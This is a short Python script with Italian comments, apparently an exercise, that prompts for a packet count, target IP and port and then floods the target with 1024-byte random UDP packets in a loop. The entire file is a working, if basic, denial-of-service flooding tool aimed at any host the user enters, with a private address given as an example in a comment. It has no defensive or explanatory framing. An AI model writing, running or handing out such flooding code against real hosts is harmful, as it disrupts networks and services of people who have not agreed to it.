import socket 
import random

#creazione pacchetti random
msg = random._urandom(1024)
#prompt utente numero pacchetti da inviare, ip e porta target 
packets = int(input("Inserisci il numero di pacchetti da inviare: ")) #chiedi all'utente quanti pacchetti vuole inviare
target_ip = input("Inserisci l'IP del target: ") #l'indirizzo 192.168.1.9
target_port = int(input("Inserisci porta target: ")) #555
#creazione del socket client
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#invio pacchetti
sent = 0 
while sent < packets: #packets = 1000
    sock.sendto(msg, (target_ip, target_port))
    sent += 1
    
print(f"{sent} pacchetti inviati.")